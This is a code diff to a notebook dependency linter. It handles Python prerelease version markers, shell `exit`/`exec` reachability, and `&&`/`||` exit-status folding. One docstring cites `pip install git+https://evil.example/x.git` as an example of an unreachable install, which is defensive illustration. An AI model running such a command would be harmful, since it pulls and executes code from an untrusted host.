@@ -86,7 +86,14 @@ COLAB_FALLBACK_FILE = DATA_DIR / "colab_pip_freeze.gpu.txt"
 # The image's Python, from the os-info oracle ("Python 3.13.15"). Only used for PEP 508
 # markers, so an unreadable snapshot just replays every requirement, as before.
 _COLAB_OS_INFO_FILE = DATA_DIR / "colab_os_info.gpu.txt"
-_COLAB_PYTHON_RE = re.compile(r"^Python\s+(\d+\.\d+(?:\.\d+)?)", re.MULTILINE)
+# The prerelease suffix is part of the version: pip skips `python_full_version >= "3.13.0"`
+# on 3.13.0rc1, and truncating to 3.13.0 replayed requirements the image never installs.
+_COLAB_PYTHON_RE = re.compile(
+    r"^Python\s+(\d+(?:\.\d+)*(?:(?:a|b|rc)\d+)?(?:\.post\d+)?(?:\.dev\d+)?)",
+    re.MULTILINE,
+)
+# The numeric release at the front of one, which is what `python_version` names.
+_PYTHON_RELEASE_RE = re.compile(r"\d+(?:\.\d+)*")
 
 
 # Follows `lint --colab-pin` so the Python version and the package snapshot come from the
@@ -121,10 +128,12 @@ def _marker_environment(colab: dict[str, str]) -> dict[str, str] | None:
     full = _colab_python_version()
     if not full:
         return None
-    parts = full.split(".")
+    release = _PYTHON_RELEASE_RE.match(full).group(0)
+    suffix = full[len(release) :]  # `rc1`, `.dev3`; `python_version` never carries one
+    parts = release.split(".")
     return {
         "python_version": ".".join(parts[:2]),
-        "python_full_version": full if len(parts) > 2 else f"{full}.0",
+        "python_full_version": (release if len(parts) > 2 else f"{release}.0") + suffix,
         "sys_platform": "linux",
         "platform_system": "Linux",
         "platform_machine": "x86_64",
@@ -1125,6 +1134,25 @@ def _command_execs(command: str) -> bool:
     return False
 
 
+def _command_ends_shell(command: str) -> bool:
+    """Does this command end the shell, so that nothing after it in the list can run?
+
+    `exec NAME` replaces it and `exit` terminates it. Recognising only the first left
+    `exit 0; pip install git+https://evil.example/x.git` reported as a reachable install, so
+    R-INST-001 and the compatibility rules fired on a command bash never reaches.
+    """
+    if _command_execs(command):
+        return True
+    seen: list[str] = []
+    rest = _strip_exec_prefixes(command.lstrip("!").strip(), seen)[0]
+    # Same rule as `exec`: `env exit 0` asks env for a PROGRAM called exit, which does not
+    # exist, and the parent shell carries on. Only the prefixes bash resolves in-process keep
+    # the builtin.
+    if any(name not in _SHELL_RESOLVED_PREFIXES for name in seen):
+        return False
+    return _split_first_word(rest)[0] == "exit"
+
+
 # `true` and `:` are documented as always succeeding, so an `&&` after one is always reached.
 # Treating every non-pip command as a possibly-failing probe dropped the install behind them.
 _ALWAYS_SUCCEEDS = frozenset({"true", ":"})
@@ -1215,6 +1243,35 @@ def _fold_and_or(assured: list[bool], prev_ops: list[str], piece_is_pip: bool) -
         assured[-1] = piece_is_pip
 
 
+def _fold_status(left: bool | None, op: str, right: bool | None) -> bool | None:
+    """The exit status of `left OP right`, or None when it cannot be known.
+
+    `&&` and `||` are left-associative, so the left operand of `a || b && c` is the WHOLE
+    `(a || b)` list, and its folded status -- not the piece nearest the operator -- decides
+    whether `c` runs.
+    """
+    if op == "&&":
+        if left is None:
+            return False if right is False else None  # `? && false` fails either way
+        return right if left else False  # a failed left skips right and keeps the failure
+    if left is None:
+        return True if right is True else None  # `? || true` succeeds either way
+    return True if left else right  # a succeeded left skips right and keeps the success
+
+
+def _left_hand_status(
+    models: list[bool | None], prev_ops: list[str], pending: str
+) -> bool | None:
+    """Fold the piece in hand into its level's running status and return the result.
+
+    Called at each `&&`/`||` so the operator sees the status of everything to its left, not
+    just the piece beside it.
+    """
+    piece = _piece_success_model(pending)
+    models[-1] = piece if prev_ops[-1] == "" else _fold_status(models[-1], prev_ops[-1], piece)
+    return models[-1]
+
+
 def _leading_shell_keywords(piece: str) -> list[str]:
     """The compound-statement words this piece opens with, in order.
 
@@ -1271,6 +1328,9 @@ def _split_chained(line: str) -> list[tuple[str, bool]]:
     # succeeds when EITHER side did, `&&` only when both, so the two combine differently and
     # the distinction cannot be recovered from `list_has_pip` alone.
     prev_ops = [""]
+    # Per level: the folded exit status of the and-or list to the LEFT of the piece in hand,
+    # three-valued because only a CERTAIN failure makes a `||` tail unconditional.
+    list_models: list[bool | None] = [None]
     buf_conditional = False
     # One entry per open `(`/`{`: True when it opened a grouping. A `)` closing a `$( )` is
     # inside a word, so a `#` after it is a literal, not a comment.
@@ -1340,6 +1400,7 @@ def _split_chained(line: str) -> list[tuple[str, bool]]:
                 case_depths.pop()
             if len(tails) > 1:
                 tails.pop()
+                list_models.pop()
                 _close_group(list_has_pip, prev_ops, last_ok, "".join(buf))
             buf.append(ch)
             i += 1
@@ -1354,13 +1415,15 @@ def _split_chained(line: str) -> list[tuple[str, bool]]:
             buf.append(ch)  # its separators are its own; the body is split on its own later
             i += 1
         elif line.startswith("||", i):
+            # `false || pip install ...` always reaches the fallback, so it is no more
+            # conditional than a bare command. Only an UNKNOWN left side opens a tail, and
+            # the left side is the whole list: `true || false || pip install ...` skips the
+            # install, and `false && true || pip install ...` always reaches it.
+            left_model = _left_hand_status(list_models, prev_ops, "".join(buf))
             _fold_pending(list_has_pip, prev_ops, "".join(buf))
             prev_ops[-1] = "||"
-            # `false || pip install ...` always reaches the fallback, so it is no more
-            # conditional than a bare command. Only an UNKNOWN left side opens a tail.
-            certain_failure = _piece_success_model("".join(buf)) is False
             flush("||")
-            tails[-1] = not certain_failure
+            tails[-1] = left_model is not False
             buf_conditional = any(tails)
             i += 2
         elif line.startswith("&&", i):
@@ -1376,6 +1439,7 @@ def _split_chained(line: str) -> list[tuple[str, bool]]:
             # `nvidia-smi && pip install torch==2.12.0` installs nothing on a CPU box, and
             # R-INST-004 is error severity, so replaying it reddened CI on a correct
             # notebook.
+            _left_hand_status(list_models, prev_ops, "".join(buf))
             _fold_pending(list_has_pip, prev_ops, "".join(buf))
             prev_ops[-1] = "&&"
             flush("&&")
@@ -1399,6 +1463,7 @@ def _split_chained(line: str) -> list[tuple[str, bool]]:
             flush(ch if ch in "&|" else ";")
             tails[-1] = False
             list_has_pip[-1] = False
+            list_models[-1] = None
             prev_ops[-1] = ""  # a new and-or list starts here
             buf_conditional = any(tails)
             i += 1
@@ -1415,6 +1480,7 @@ def _split_chained(line: str) -> list[tuple[str, bool]]:
                 )
                 tails.append(False)
                 list_has_pip.append(False)
+                list_models.append(None)
                 prev_ops.append("")
                 last_ok.append(None)
                 case_depths.append(0)
@@ -1428,6 +1494,7 @@ def _split_chained(line: str) -> list[tuple[str, bool]]:
                     # The command in hand belongs to the level being closed, so its flag stays
                     # what it was; the pop only affects what comes after.
                     tails.pop()
+                    list_models.pop()
                     _close_group(list_has_pip, prev_ops, last_ok, "".join(buf))
             if ch not in ")}":
                 grouping_closed = False
@@ -1447,7 +1514,7 @@ def _split_chained(line: str) -> list[tuple[str, bool]]:
     # inner one is a command of its own. Read off the raw pieces, since the unwrap above
     # strips an assignment prefix like ``X=`pip install y` ``.
     ordered: list[tuple[str, bool]] = []
-    # An unconditional `exec` replaces the shell, so every OUTER command after it is
+    # An unconditional `exec` or `exit` ends the shell, so every OUTER command after it is
     # unreachable. Its own substitutions still expanded first, and one inside a `$( )` only
     # replaces that subshell, so this is applied at this level alone.
     handed_over = False
@@ -1519,7 +1586,7 @@ def _split_chained(line: str) -> list[tuple[str, bool]]:
             handed_over = (
                 not piece_conditional
                 and separator not in ("|", "&")  # a subshell; the parent shell carries on
-                and _command_execs(piece)
+                and _command_ends_shell(piece)
             )
     return ordered
 
@@ -2223,7 +2290,12 @@ def _effective_version(
                 # no floor under it stays unknown (the case just above): which release sits
                 # below it is only in the index, and there is no floor to bound the guess.
                 current, exact_known = landing, True
-            elif floor is not None and not exclusive_floor:
+            elif floor is not None:
+                # `>V` does not admit V itself, but an INEXACT bound is only read by checks
+                # that must hold for every release at or above it, so carrying one extra
+                # version can only under-report. Dropping the bound entirely stopped those
+                # checks running at all: `pip install "torch>2.11"` beside torchcodec 0.10
+                # went unreported while the equivalent `torch>=2.11.1` was caught.
                 current, exact_known = floor, False
             elif forced_off:
                 # `--upgrade` moves to the newest available release, so whatever is installed
@@ -2240,10 +2312,11 @@ def _effective_version(
                 current, exact_known = cap, cap_exact  # `<=V` allows V, so V is what pip picks
             elif landing is not None:
                 current, exact_known = landing, True  # the window pins the minor
-            elif exclusive_floor:
-                current, exact_known = None, True  # nothing names where it went
             else:
-                current, exact_known = floor, False  # at least the floor, possibly newer
+                # At least the floor, possibly newer. `>V` excludes V itself, but see the
+                # absent-package branch above: an inexact bound that carries one extra
+                # version is sound, and discarding it silenced the rule entirely.
+                current, exact_known = floor, False
         elif cap is not None and cmp_versions(current, cap) > 0:
             current, exact_known = cap, cap_exact  # `<=V` allows V, so V is what pip picks
         elif ceiling is not None and cmp_versions(current, ceiling) >= 0:
@@ -2999,7 +3072,11 @@ def _diff_oracle(
 # accepts `Python <digits>`, so an upstream reformat leaves the key present, both sides equal,
 # and marker evaluation quietly disabled.
 _STRICT_KEY_VALUE_RE: dict[tuple[str, str], "re.Pattern[str]"] = {
-    ("os-info-gpu.txt", "python"): re.compile(r"^\d+\.\d+(?:\.\d+)?"),
+    # Matches what _COLAB_PYTHON_RE reads, prerelease included, so a rotation the parse
+    # would truncate cannot be acknowledged as usable.
+    ("os-info-gpu.txt", "python"): re.compile(
+        r"^\d+(?:\.\d+)*(?:(?:a|b|rc)\d+)?(?:\.post\d+)?(?:\.dev\d+)?(?:\s|$)"
+    ),
 }
 
 
